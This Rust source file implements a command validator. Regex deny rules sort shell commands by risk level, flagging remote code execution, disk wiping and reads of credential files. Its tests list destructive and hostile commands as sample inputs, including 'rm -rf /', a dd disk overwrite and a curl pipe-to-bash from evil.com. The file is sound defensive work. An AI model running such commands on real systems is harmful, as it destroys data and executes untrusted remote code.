use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use tracing::{debug, warn, error};

use super::CommandValidationConfig;

#[derive(Debug, Clone, Copy, PartialEq, PartialOrd, Serialize, Deserialize)]
pub enum RiskLevel {
    Low,      // Safe commands, minimal logging
    Medium,   // Potentially risky, log and warn
    High,     // Dangerous, requires approval
    Critical, // Extremely dangerous, block or require explicit approval
}

#[derive(Debug, Clone)]
pub struct DangerousPattern {
    pub pattern: Regex,
    pub risk_level: RiskLevel,
    pub description: String,
    pub category: String,
}

#[derive(Debug, Clone)]
pub struct ValidationResult {
    pub allowed: bool,
    pub risk_level: RiskLevel,
    pub reason: String,
    pub matched_patterns: Vec<String>,
}

#[derive(Debug, Clone)]
pub struct CommandValidator {
    dangerous_patterns: Vec<DangerousPattern>,
    config: CommandValidationConfig,
}

impl CommandValidator {
    pub fn new(config: &CommandValidationConfig) -> Result<Self, Box<dyn std::error::Error>> {
        let dangerous_patterns = Self::build_dangerous_patterns()?;
        
        Ok(Self {
            dangerous_patterns,
            config: config.clone(),
        })
    }

    /// Validate a command and return risk assessment
    pub fn validate_command(&self, command: &str) -> Result<ValidationResult, String> {
        if !self.config.enable_blacklist {
            return Ok(ValidationResult {
                allowed: true,
                risk_level: RiskLevel::Low,
                reason: "Validation disabled".to_string(),
                matched_patterns: vec![],
            });
        }

        let command_lower = command.to_lowercase();
        let mut highest_risk = RiskLevel::Low;
        let mut matched_patterns = Vec::new();
        let mut reasons = Vec::new();

        // Check against all dangerous patterns
        for pattern in &self.dangerous_patterns {
            if pattern.pattern.is_match(&command_lower) {
                debug!("Command '{}' matched pattern: {}", command, pattern.description);
                
                matched_patterns.push(pattern.description.clone());
                reasons.push(format!("{}: {}", pattern.category, pattern.description));
                
                // Update highest risk level
                highest_risk = match (&highest_risk, &pattern.risk_level) {
                    (_, RiskLevel::Critical) => RiskLevel::Critical,
                    (RiskLevel::Critical, _) => RiskLevel::Critical,
                    (_, RiskLevel::High) => RiskLevel::High,
                    (RiskLevel::High, _) => RiskLevel::High,
                    (_, RiskLevel::Medium) => RiskLevel::Medium,
                    (RiskLevel::Medium, _) => RiskLevel::Medium,
                    _ => RiskLevel::Low,
                };
            }
        }

        // Special handling for sudo commands
        if self.config.require_approval_for_sudo && command_lower.contains("sudo") {
            if highest_risk < RiskLevel::High {
                highest_risk = RiskLevel::High;
                reasons.push("Command contains 'sudo' - elevated privileges".to_string());
            }
        }

        let allowed = match highest_risk {
            RiskLevel::Critical => !self.config.auto_deny_critical_commands,
            _ => true,
        };

        let reason = if reasons.is_empty() {
            "No security concerns detected".to_string()
        } else {
            reasons.join("; ")
        };

        let result = ValidationResult {
            allowed,
            risk_level: highest_risk,
            reason,
            matched_patterns,
        };

        // Log based on risk level
        match result.risk_level {
            RiskLevel::Critical => {
                error!("CRITICAL RISK command detected: '{}' - {}", command, result.reason);
            },
            RiskLevel::High => {
                warn!("HIGH RISK command detected: '{}' - {}", command, result.reason);
            },
            RiskLevel::Medium => {
                warn!("MEDIUM RISK command detected: '{}' - {}", command, result.reason);
            },
            RiskLevel::Low => {
                debug!("Low risk command: '{}'", command);
            }
        }

        Ok(result)
    }

    /// Build the comprehensive list of dangerous command patterns
    fn build_dangerous_patterns() -> Result<Vec<DangerousPattern>, Box<dyn std::error::Error>> {
        let mut patterns = Vec::new();

        // CRITICAL RISK PATTERNS - File system destruction
        patterns.extend(vec![
            DangerousPattern {
                pattern: Regex::new(r"rm\s+(-\w*r\w*f|--recursive\s+--force).*/?$")?,
                risk_level: RiskLevel::Critical,
                description: "Recursive force deletion (rm -rf /)".to_string(),
                category: "File Destruction".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"sudo\s+rm\s+(-\w*r\w*f|--recursive\s+--force)")?,
                risk_level: RiskLevel::Critical,
                description: "Sudo recursive force deletion".to_string(),
                category: "File Destruction".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"del\s+/[fs]\s+/[sq]\s+c:\\")?,
                risk_level: RiskLevel::Critical,
                description: "Windows system drive deletion".to_string(),
                category: "File Destruction".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"format\s+c:")?,
                risk_level: RiskLevel::Critical,
                description: "Windows system drive format".to_string(),
                category: "File Destruction".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"dd\s+if=/dev/zero\s+of=/dev/")?,
                risk_level: RiskLevel::Critical,
                description: "Disk overwrite with zeros".to_string(),
                category: "File Destruction".to_string(),
            },
        ]);

        // CRITICAL RISK PATTERNS - Permission manipulation
        patterns.extend(vec![
            DangerousPattern {
                pattern: Regex::new(r"chmod\s+(-R\s+)?777\s+/")?,
                risk_level: RiskLevel::Critical,
                description: "Recursive 777 permissions on root".to_string(),
                category: "Permission Manipulation".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"chown\s+(-R\s+)?root:root\s+/")?,
                risk_level: RiskLevel::Critical,
                description: "Recursive root ownership change".to_string(),
                category: "Permission Manipulation".to_string(),
            },
        ]);

        // CRITICAL RISK PATTERNS - Remote code execution
        patterns.extend(vec![
            DangerousPattern {
                pattern: Regex::new(r"curl\s+.*\|\s*(bash|sh|zsh|fish)")?,
                risk_level: RiskLevel::Critical,
                description: "Remote code execution via curl pipe".to_string(),
                category: "Remote Code Execution".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"wget\s+.*\|\s*(bash|sh|zsh|fish)")?,
                risk_level: RiskLevel::Critical,
                description: "Remote code execution via wget pipe".to_string(),
                category: "Remote Code Execution".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"curl\s+.*\|\s*python")?,
                risk_level: RiskLevel::Critical,
                description: "Remote Python code execution".to_string(),
                category: "Remote Code Execution".to_string(),
            },
        ]);

        // HIGH RISK PATTERNS - Package management destruction
        patterns.extend(vec![
            DangerousPattern {
                pattern: Regex::new(r"npm\s+uninstall\s+-g\s+\*")?,
                risk_level: RiskLevel::High,
                description: "Uninstall all global npm packages".to_string(),
                category: "Package Management".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"pip\s+uninstall\s+.*--yes")?,
                risk_level: RiskLevel::High,
                description: "Force uninstall Python packages".to_string(),
                category: "Package Management".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"apt-get\s+remove\s+--purge")?,
                risk_level: RiskLevel::High,
                description: "Purge system packages".to_string(),
                category: "Package Management".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"yum\s+erase\s+")?,
                risk_level: RiskLevel::High,
                description: "Remove system packages".to_string(),
                category: "Package Management".to_string(),
            },
        ]);

        // HIGH RISK PATTERNS - System modification
        patterns.extend(vec![
            DangerousPattern {
                pattern: Regex::new(r"sudo\s+.*(/etc|/usr/bin|/System)")?,
                risk_level: RiskLevel::High,
                description: "Sudo access to system directories".to_string(),
                category: "System Modification".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"systemctl\s+(stop|disable)\s+")?,
                risk_level: RiskLevel::High,
                description: "Disable system services".to_string(),
                category: "System Modification".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"service\s+\w+\s+stop")?,
                risk_level: RiskLevel::High,
                description: "Stop system services".to_string(),
                category: "System Modification".to_string(),
            },
        ]);

        // HIGH RISK PATTERNS - Process manipulation
        patterns.extend(vec![
            DangerousPattern {
                pattern: Regex::new(r"killall\s+-9")?,
                risk_level: RiskLevel::High,
                description: "Force kill all processes".to_string(),
                category: "Process Management".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"pkill\s+-9")?,
                risk_level: RiskLevel::High,
                description: "Force kill processes by name".to_string(),
                category: "Process Management".to_string(),
            },
        ]);

        // MEDIUM RISK PATTERNS - File operations
        patterns.extend(vec![
            DangerousPattern {
                pattern: Regex::new(r"rm\s+-rf\s+")?,
                risk_level: RiskLevel::Medium,
                description: "Recursive force deletion".to_string(),
                category: "File Operations".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"mv\s+.*\s+/tmp")?,
                risk_level: RiskLevel::Medium,
                description: "Move files to temp directory".to_string(),
                category: "File Operations".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"find\s+.*-delete")?,
                risk_level: RiskLevel::Medium,
                description: "Find and delete files".to_string(),
                category: "File Operations".to_string(),
            },
        ]);

        // MEDIUM RISK PATTERNS - Network operations
        patterns.extend(vec![
            DangerousPattern {
                pattern: Regex::new(r"nc\s+.*-e")?,
                risk_level: RiskLevel::Medium,
                description: "Netcat with command execution".to_string(),
                category: "Network Operations".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"telnet\s+")?,
                risk_level: RiskLevel::Medium,
                description: "Telnet connection".to_string(),
                category: "Network Operations".to_string(),
            },
        ]);

        // MEDIUM RISK PATTERNS - Compilation and execution
        patterns.extend(vec![
            DangerousPattern {
                pattern: Regex::new(r"gcc\s+.*&&\s*\./")?,
                risk_level: RiskLevel::Medium,
                description: "Compile and execute C code".to_string(),
                category: "Code Execution".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"make\s+.*&&\s*\./")?,
                risk_level: RiskLevel::Medium,
                description: "Build and execute code".to_string(),
                category: "Code Execution".to_string(),
            },
        ]);

        // LOW RISK PATTERNS - Information gathering
        patterns.extend(vec![
            DangerousPattern {
                pattern: Regex::new(r"cat\s+/etc/passwd")?,
                risk_level: RiskLevel::Low,
                description: "Reading password file".to_string(),
                category: "Information Gathering".to_string(),
            },
            DangerousPattern {
                pattern: Regex::new(r"cat\s+/etc/shadow")?,
                risk_level: RiskLevel::Low,
                description: "Reading shadow file".to_string(),
                category: "Information Gathering".to_string(),
            },
        ]);

        Ok(patterns)
    }

    /// Check if a command requires approval based on configuration
    pub fn requires_approval(&self, command: &str) -> bool {
        match self.validate_command(command) {
            Ok(result) => matches!(result.risk_level, RiskLevel::High | RiskLevel::Critical),
            Err(_) => true, // If validation fails, err on side of caution
        }
    }

    /// Get statistics about dangerous patterns
    pub fn get_pattern_stats(&self) -> HashMap<String, usize> {
        let mut stats = HashMap::new();
        for pattern in &self.dangerous_patterns {
            *stats.entry(pattern.category.clone()).or_insert(0) += 1;
        }
        stats
    }

    /// Get all patterns for a specific risk level
    pub fn get_patterns_by_risk(&self, risk_level: RiskLevel) -> Vec<&DangerousPattern> {
        self.dangerous_patterns
            .iter()
            .filter(|p| p.risk_level == risk_level)
            .collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn create_test_validator() -> CommandValidator {
        let config = CommandValidationConfig {
            enable_blacklist: true,
            require_approval_for_sudo: true,
            require_approval_for_destructive: true,
            auto_deny_critical_commands: true,
        };
        CommandValidator::new(&config).unwrap()
    }

    #[test]
    fn test_critical_commands() {
        let validator = create_test_validator();
        
        let critical_commands = vec![
            "rm -rf /",
            "sudo rm -rf /*",
            "format c:",
            "del /f /s /q c:\\*",
            "dd if=/dev/zero of=/dev/sda",
            "curl http://evil.com/script | bash",
        ];

        for cmd in critical_commands {
            let result = validator.validate_command(cmd).unwrap();
            assert_eq!(result.risk_level, RiskLevel::Critical, "Command should be critical: {}", cmd);
        }
    }

    #[test]
    fn test_high_risk_commands() {
        let validator = create_test_validator();
        
        let high_risk_commands = vec![
            "sudo systemctl stop ssh",
            "chmod 777 /etc",
            "killall -9 firefox",
        ];

        for cmd in high_risk_commands {
            let result = validator.validate_command(cmd).unwrap();
            assert!(matches!(result.risk_level, RiskLevel::High | RiskLevel::Critical), 
                   "Command should be high/critical risk: {}", cmd);
        }
    }

    #[test]
    fn test_safe_commands() {
        let validator = create_test_validator();
        
        let safe_commands = vec![
            "ls -la",
            "cat README.md",
            "echo 'hello world'",
            "grep 'pattern' file.txt",
            "cargo build",
        ];

        for cmd in safe_commands {
            let result = validator.validate_command(cmd).unwrap();
            assert_eq!(result.risk_level, RiskLevel::Low, "Command should be safe: {}", cmd);
        }
    }

    #[test]
    fn test_sudo_detection() {
        let validator = create_test_validator();
        
        let result = validator.validate_command("sudo ls").unwrap();
        assert!(matches!(result.risk_level, RiskLevel::High | RiskLevel::Critical));
        assert!(result.reason.contains("sudo"));
    }

    #[test]
    fn test_pattern_stats() {
        let validator = create_test_validator();
        let stats = validator.get_pattern_stats();
        
        assert!(stats.contains_key("File Destruction"));
        assert!(stats.contains_key("Permission Manipulation"));
        assert!(stats.contains_key("Remote Code Execution"));
    }
}